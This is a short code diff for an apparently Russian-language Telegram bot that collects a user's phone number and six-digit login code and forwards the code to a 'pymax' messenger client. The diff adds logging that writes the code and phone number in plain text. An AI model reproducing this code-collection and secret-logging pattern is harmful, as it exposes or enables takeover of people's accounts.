@@ -102,6 +102,7 @@ async def phone_handler(message: types.Message, state: FSMContext):
             pending[uid]["status"] = "done"
         except Exception as e:
             error = str(e).lower()
+            logging.error(f"Ошибка авторизации: {e}")
             if "block" in error:
                 pending[uid]["status"] = "blocked"
             elif "flood" in error or "limit" in error:
@@ -119,7 +120,7 @@ async def phone_handler(message: types.Message, state: FSMContext):
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
 async def code_handler(message: types.Message, state: FSMContext):
     uid = message.from_user.id
-    code = message.text.strip()
+    code = str(message.text.strip())
     
     if uid not in pending:
         return await message.answer("⏳ Сессия устарела. Отправь номер заново через /start.")
@@ -130,6 +131,7 @@ async def code_handler(message: types.Message, state: FSMContext):
     
     import builtins
     builtins._code = code
+    logging.info(f"Код передан в pymax: {code} для номера {phone}")
     
     msg = await message.answer("⏳ Проверяю код...")
     
